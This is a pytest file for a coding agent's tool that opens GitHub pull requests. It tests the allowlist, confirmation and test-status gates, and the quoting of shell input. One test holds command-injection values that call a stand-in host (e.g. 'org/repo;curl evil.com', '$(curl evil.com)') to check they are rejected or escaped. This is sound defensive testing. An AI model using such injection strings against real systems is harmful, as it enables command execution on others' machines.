import shlex
from types import SimpleNamespace

import pytest
import write_confirmation
from coding.open_pull_request import build_open_pull_request
from coding.sandbox import PerJobDaytonaBackend


class FakeBox:
    def __init__(self):
        self.commands = []
        self.writes = []

    def execute(self, command, **_kwargs):
        self.commands.append(command)
        return SimpleNamespace(
            output="https://github.com/org/repo/pull/9",
            exit_code=0,
        )

    def write(self, file_path, content):
        self.writes.append((file_path, content))

    def delete(self):
        pass


def _tool(monkeypatch, backend=None):
    monkeypatch.setenv("DAYTONA_SNAPSHOT", "test-snap")
    backend = backend or PerJobDaytonaBackend(create_sandbox=lambda **_k: FakeBox())
    monkeypatch.setattr("coding.sandbox.current_run_id", lambda: "run-a")
    backend.execute("true")
    return build_open_pull_request(backend), backend


def test_red_check_without_open_anyway_does_not_run_gh(monkeypatch):
    monkeypatch.delenv("GITHUB_ALLOWED_REPOS", raising=False)
    tool, backend = _tool(monkeypatch)
    with pytest.raises(RuntimeError, match="test_exit_code"):
        tool.invoke(
            {
                "repo": "org/repo",
                "base": "main",
                "head": "fix/ci",
                "title": "Fix CI",
                "body": "green the unit job",
                "test_command": "pnpm test",
                "test_exit_code": 1,
                "open_anyway": False,
            }
        )
    assert not any("gh pr create" in cmd for cmd in backend._boxes["run-a"].commands)


def test_allowlist_miss_does_not_run_gh(monkeypatch):
    monkeypatch.setenv("GITHUB_ALLOWED_REPOS", "CopilotKit/*")
    tool, backend = _tool(monkeypatch)
    with pytest.raises(RuntimeError, match="GITHUB_ALLOWED_REPOS"):
        tool.invoke(
            {
                "repo": "other/repo",
                "base": "main",
                "head": "fix/ci",
                "title": "Fix CI",
                "body": "nope",
                "test_command": "pnpm test",
                "test_exit_code": 0,
            }
        )
    assert not any("gh pr create" in cmd for cmd in backend._boxes["run-a"].commands)


def test_rejected_confirm_does_not_run_gh(monkeypatch):
    monkeypatch.delenv("GITHUB_ALLOWED_REPOS", raising=False)
    monkeypatch.setattr(
        "coding.open_pull_request.require_write_confirmation",
        lambda **_k: False,
    )
    tool, backend = _tool(monkeypatch)
    result = tool.invoke(
        {
            "repo": "org/repo",
            "base": "main",
            "head": "fix/ci",
            "title": "Fix CI",
            "body": "draft",
            "test_command": "pnpm test",
            "test_exit_code": 0,
        }
    )
    assert "cancelled" in result.lower()
    assert not any("gh pr create" in cmd for cmd in backend._boxes["run-a"].commands)


def test_approve_and_green_runs_draft_pr(monkeypatch):
    monkeypatch.delenv("GITHUB_ALLOWED_REPOS", raising=False)
    monkeypatch.setattr(
        "coding.open_pull_request.require_write_confirmation",
        lambda **_k: True,
    )
    tool, backend = _tool(monkeypatch)
    result = tool.invoke(
        {
            "repo": "org/repo",
            "base": "main",
            "head": "fix/ci",
            "title": "Fix CI",
            "body": "draft",
            "test_command": "pnpm test",
            "test_exit_code": 0,
        }
    )
    assert "https://github.com/org/repo/pull/9" in result
    assert any(
        "gh pr create" in cmd and "--draft" in cmd
        for cmd in backend._boxes["run-a"].commands
    )


def test_shell_metacharacters_are_quoted_and_invalid_repo_rejected(monkeypatch):
    monkeypatch.delenv("GITHUB_ALLOWED_REPOS", raising=False)
    monkeypatch.setattr(
        "coding.open_pull_request.require_write_confirmation",
        lambda **_k: True,
    )
    tool, backend = _tool(monkeypatch)
    box = backend._boxes["run-a"]

    with pytest.raises(RuntimeError, match="invalid repo"):
        tool.invoke(
            {
                "repo": "org/repo;curl evil.com",
                "base": "main",
                "head": "fix/ci",
                "title": "Fix CI",
                "body": "nope",
                "test_command": "pnpm test",
                "test_exit_code": 0,
            }
        )
    assert not any("gh pr create" in cmd for cmd in box.commands)
    assert box.writes == []

    evil_title = 'foo"; curl evil.com #'
    result = tool.invoke(
        {
            "repo": "org/repo",
            "base": "main",
            "head": "fix/ci",
            "title": evil_title,
            "body": "body with $(curl evil.com) and `id`",
            "test_command": "pnpm test",
            "test_exit_code": 0,
        }
    )
    assert "https://github.com/org/repo/pull/9" in result
    assert box.writes == [("/tmp/opentag-pr-body.md", "body with $(curl evil.com) and `id`")]
    create_cmds = [cmd for cmd in box.commands if "gh pr create" in cmd]
    assert len(create_cmds) == 1
    cmd = create_cmds[0]
    quoted_title = shlex.quote(evil_title)
    assert quoted_title in cmd
    assert f"--title {quoted_title}" in cmd
    assert shlex.quote("org/repo") in cmd
    assert shlex.quote("main") in cmd
    assert shlex.quote("fix/ci") in cmd
    assert shlex.quote("/tmp/opentag-pr-body.md") in cmd
    assert "--body-file" in cmd
    assert "<<" not in cmd
    # Unquoted title would leave a raw double-quote before the semicolon payload.
    assert '"; curl' not in cmd.replace(quoted_title, "")


def test_gh_failure_after_approval_emits_then_raises(monkeypatch):
    monkeypatch.delenv("GITHUB_ALLOWED_REPOS", raising=False)
    monkeypatch.setattr(
        "coding.open_pull_request.require_write_confirmation",
        lambda **_k: True,
    )
    emitted = []

    async def emit(_config, message):
        emitted.append(message)

    monkeypatch.setattr(write_confirmation, "copilotkit_emit_message", emit)
    monkeypatch.setattr(write_confirmation, "ensure_config", lambda: {})

    class FailingGhBox(FakeBox):
        def execute(self, command, **_kwargs):
            self.commands.append(command)
            if "gh pr create" in command:
                return SimpleNamespace(output="HTTP 401", exit_code=1)
            return SimpleNamespace(output="ok", exit_code=0)

    tool, _backend = _tool(
        monkeypatch,
        backend=PerJobDaytonaBackend(create_sandbox=lambda **_k: FailingGhBox()),
    )
    with pytest.raises(RuntimeError, match="gh pr create failed"):
        tool.invoke(
            {
                "repo": "org/repo",
                "base": "main",
                "head": "fix/ci",
                "title": "Fix CI",
                "body": "draft",
                "test_command": "pnpm test",
                "test_exit_code": 0,
            }
        )
    assert emitted
    assert "failed" in emitted[0]
    assert "HTTP 401" in emitted[0]
